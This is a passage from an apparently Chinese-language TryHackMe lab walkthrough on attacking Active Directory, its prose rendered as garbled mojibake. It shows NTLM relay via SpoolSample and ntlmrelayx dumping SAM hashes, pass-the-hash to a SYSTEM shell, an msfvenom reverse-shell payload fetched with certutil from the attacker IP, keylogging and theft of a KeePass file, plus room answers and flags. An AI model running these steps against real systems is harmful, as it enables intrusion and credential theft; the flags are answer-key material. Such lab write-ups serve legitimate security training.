|_    Message signing enabled but not required

Nmap done: 2 IP addresses (2 hosts up) scanned in 18.92 seconds

```

æ˜¾ç¤ºMessage signing enabled but not requiredï¼Œè¡¨ç¤ºå¼€å¯äº†smbï¼Œä½†æœªå¼ºåˆ¶ç­¾å

æ‰€æœ‰æ¡ä»¶æ»¡è¶³

æ‰§è¡Œæ”»å‡»ï¼š

1. kaliå¼€å¯ntlmrelayxç›‘å¬ï¼Œsmbå‚æ•°é‡Œçš„IPæ˜¯æˆ‘ä»¬éœ€è¦æ”¶é›†å“ˆå¸Œä¿¡æ¯çš„IPï¼Œå³THMSERVER1ã€‚æ³¨æ„ï¼Œè¿™é‡Œå¦‚æžœå¡«åŸŸåçš„è¯ä¼šèµ°kerberosè®¤è¯ï¼Œå¡«IPæ‰ä¼šèµ°NTLMè®¤è¯ï¼Œæ‰€ä»¥å¿…é¡»å¡«IP

```
python3 /usr/share/doc/python3-impacket/examples/ntlmrelayx.py -t smb://10.200.83.201 -smb2support -debug
```

2. åœ¨THMWRK1ä¸Šè§¦å‘SMBæµé‡,æœ€åŽé‚£ä¸ªIPæ˜¯æˆ‘ä»¬kaliçš„IPåœ°å€

```
PS C:\tools> .\SpoolSample.exe THMSERVER2.za.tryhackme.loc 10.50.81.218
[+] Converted DLL to shellcode
[+] Executing RDI
[+] Calling exported function
TargetServer: \\THMSERVER2.za.tryhackme.loc, CaptureServer: \\10.50.81.218
Target server attempted authentication and got an access denied.  If coercing authentication to 
an NTLM challenge-response capture tool(e.g. responder/inveigh/MSF SMB capture), this is expecte
d and indicates the coerced authentication worked.

```

3. ntlmrelayxæ”¶åˆ°smbæµé‡

```
â”Œâ”€â”€(rootðŸ’€kali)-[~/tryhackme/ExploitingActiveDirectory]
â””â”€# python3 /usr/share/doc/python3-impacket/examples/ntlmrelayx.py -t smb://10.200.83.201 -smb2support -debug
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[+] Impacket Library Installation Path: /usr/local/lib/python3.9/dist-packages/impacket
[*] Protocol Client SMB loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client SMTP loaded..
[+] Protocol Attack HTTP loaded..
[+] Protocol Attack HTTPS loaded..
[+] Protocol Attack MSSQL loaded..
[+] Protocol Attack LDAP loaded..
[+] Protocol Attack LDAPS loaded..
[+] Protocol Attack DCSYNC loaded..
[+] Protocol Attack IMAP loaded..
[+] Protocol Attack IMAPS loaded..
[+] Protocol Attack SMB loaded..
[+] Protocol Attack RPC loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server
[*] Setting up HTTP Server
[*] Setting up WCF Server

[*] Servers started, waiting for connections
[*] SMBD-Thread-4: Connection from ZA/THMSERVER2$@10.200.83.202 controlled, attacking target smb://10.200.83.201
[*] Authenticating against smb://10.200.83.201 as ZA/THMSERVER2$ SUCCEED
[+] No more targets for user ZA/THMSERVER2$
[*] SMBD-Thread-4: Connection from ZA/THMSERVER2$@10.200.83.202 controlled, but there are no more targets left!
[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[+] Retrieving class info for JD
[+] Retrieving class info for Skew1
[+] Retrieving class info for GBG
[+] Retrieving class info for Data
[*] Target system bootKey: 0x4e05e7ea4fdddde75aa56010474948dc
[+] Saving remote SAM database
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
[+] Calculating HashedBootKey from SAM
[+] NewStyle hashes is: True
ServerAdmin:500:aad3b435b51404eeaad3b435b51404ee:3279a0c6dfe15dc3fb6e9c26dd9b066c:::
[+] NewStyle hashes is: True
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[+] NewStyle hashes is: True
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[+] NewStyle hashes is: True
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:92728d5173fc94a54e84f8b457af63a8:::
[+] NewStyle hashes is: True
vagrant:1000:aad3b435b51404eeaad3b435b51404ee:e96eab5f240174fe2754efc94f6a53ae:::
[+] NewStyle hashes is: True
trevor.local:1001:aad3b435b51404eeaad3b435b51404ee:43460d636f269c709b20049cee36ae7a:::
[*] Done dumping SAM hashes for host: 10.200.83.201
[*] Stopping service RemoteRegistry

```

å¯ä»¥çœ‹åˆ°å·²ç»æ‰“å°å‡ºTHMSERVER1çš„samæ•°æ®åº“é‡Œçš„å“ˆå¸Œä¿¡æ¯

```
ServerAdmin:500:aad3b435b51404eeaad3b435b51404ee:3279a0c6dfe15dc3fb6e9c26dd9b066c:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:92728d5173fc94a54e84f8b457af63a8:::
vagrant:1000:aad3b435b51404eeaad3b435b51404ee:e96eab5f240174fe2754efc94f6a53ae:::
trevor.local:1001:aad3b435b51404eeaad3b435b51404ee:43460d636f269c709b20049cee36ae7a:::
```


pth æ‹¿åˆ°flag

```
â”Œâ”€â”€(rootðŸ’€kali)-[~/tryhackme/ExploitingActiveDirectory]
â””â”€# python3 /usr/share/doc/python3-impacket/examples/psexec.py  -hashes "aad3b435b51404eeaad3b435b51404ee:3279a0c6dfe15dc3fb6e9c26dd9b066c" ServerAdmin@10.200.83.201                                                                   1 â¨¯
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Requesting shares on 10.200.83.201.....
[*] Found writable share ADMIN$
[*] Uploading file FvdiIslE.exe
[*] Opening SVCManager on 10.200.83.201.....
[*] Creating service Yzmr on 10.200.83.201.....
[*] Starting service Yzmr.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.1098]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> hostname
THMSERVER1

C:\Windows\system32> cd c:/users/Administrator.ZA/desktop
 
c:\Users\Administrator.ZA\Desktop> dir
 Volume in drive C is Windows
 Volume Serial Number is 1634-22A9

 Directory of c:\Users\Administrator.ZA\Desktop

2022/05/01  15:49    <DIR>          .
2022/05/01  15:49    <DIR>          ..
2022/05/01  15:50                25 flag3.txt
               1 File(s)             25 bytes
[-] Decoding error detected, consider running chcp.com at the target,
map the result with https://docs.python.org/3/library/codecs.html#standard-encodings
and then execute smbexec.py again with -codec and the corresponding codec
               2 Dir(s)  50ï¿½903ï¿½248ï¿½896 bytes free


c:\Users\Administrator.ZA\Desktop> type flag3.txt
THM{Printing.Some.Shellz}

```


> How often (in days) are the passwords of Windows machine accounts rotated by default?

> 30

> What should not be enforced if we want to relay an SMB authentication attempt?

> SMB Signing

> What is the value of the flag stored in the Desktop directory of the Administrator.ZA user on THMSERVER1 (flag3.txt)?

> THM{Printing.Some.Shellz}


# Task 5  Exploiting AD Users

åœ¨THMSERVER1çš„trevor.localç”¨æˆ·æ–‡æ¡£é‡Œæ‰¾åˆ°ä¸€ä¸ªkeepassæ–‡ä»¶
```
c:\Users\t1_trevor.jones\Documents> dir
 Volume in drive C is Windows
 Volume Serial Number is 1634-22A9

 Directory of c:\Users\t1_trevor.jones\Documents

2022/04/30  16:36    <DIR>          .
2022/04/30  16:36    <DIR>          ..
2022/04/30  16:36             2ï¿½190 PasswordDatabase.kdbx

```

ç¼–è¯‘ä¸€ä¸ªmeterpreter
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.50.81.218 LPORT="4444" -f exe -o shell.exe
```


ä¼ åˆ°é¶æœº
```
certutil.exe -urlcache -split -f http://10.50.81.218/shell.exe
```

ç›‘å¬
```
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 10.50.81.218; set LPORT '4444'; exploit"
```

æ‰§è¡Œè§¦å‘ï¼Œæ”¶åˆ°rev shell
```
â”Œâ”€â”€(rootðŸ’€kali)-[~/tryhackme/ExploitingActiveDirectory]
â””â”€# msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 10.50.81.218; set LPORT '4444'; exploit"
[*] Using configured payload generic/shell_reverse_tcp
PAYLOAD => windows/x64/meterpreter/reverse_tcp
LHOST => 10.50.81.218
LPORT => 4444
[*] Started reverse TCP handler on 10.50.81.218:4444 
[*] Sending stage (200774 bytes) to 10.200.83.201
[*] Meterpreter session 1 opened (10.50.81.218:4444 -> 10.200.83.201:54456) at 2022-08-12 05:09:55 -0400

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```



psæŸ¥çœ‹ç”¨æˆ·t1_trevor.jonesçš„è¿›ç¨‹

```
meterpreter > ps 

Process List
============

 PID   PPID  Name             Arch  Session  User                Path
 ---   ----  ----             ----  -------  ----                ----
 3412  688   wsmprovhost.exe  x64   0        ZA\t1_trevor.jones  C:\Windows\System32\wsmprovhost.exe

```

è¿ç§»è¿›ç¨‹ï¼Œä»¥çš„èº«ä»½æ‰§è¡Œä¸‹é¢çš„æ“ä½œ
```
meterpreter > migrate 3412
[*] Migrating from 3932 to 3412...
[*] Migration completed successfully.
meterpreter > getuid
Server username: ZA\t1_trevor.jones
```

å¼€å¯é”®ç›˜ç›‘å¬
```
meterpreter > keyscan_start
Starting the keystroke sniffer ...
```


ä¸‹è½½keepassæ–‡ä»¶
```
meterpreter > download PasswordDatabase.kdbx
[*] Downloading: PasswordDatabase.kdbx -> /root/tryhackme/ExploitingActiveDirectory/PasswordDatabase.kdbx
[*] Downloaded 1.84 KiB of 1.84 KiB (100.0%): PasswordDatabase.kdbx -> /root/tryhackme/ExploitingActiveDirectory/PasswordDatabase.kdbx
[*] download   : PasswordDatabase.kdbx -> /root/tryhackme/ExploitingActiveDirectory/PasswordDatabase.kdbx
```


è¿™é‡Œæˆ‘åŒæ—¶ç›‘å¬äº†trevor.localå’Œt1_trevor.jonesçš„é”®ç›˜è®°å½•ï¼Œç­‰äº†å¾ˆä¹…ä¹Ÿæ²¡æœ‰æ”¶é›†åˆ°å¯†ç ï¼Œæ„Ÿè§‰labæœ‰é—®é¢˜ã€‚ã€‚ã€‚


> What application is used to open the kdbx credential database?

> keepass

> What meterpreter command do we use to move from SYSTEM to user context?

> migrate

> What is the password of the credential database?

> Imreallysurenoonewillguessmypassword

> What is the value of the flag stored in the credential database?

> THM{AD.Users.Can.Give.Up.Good.Secrets}



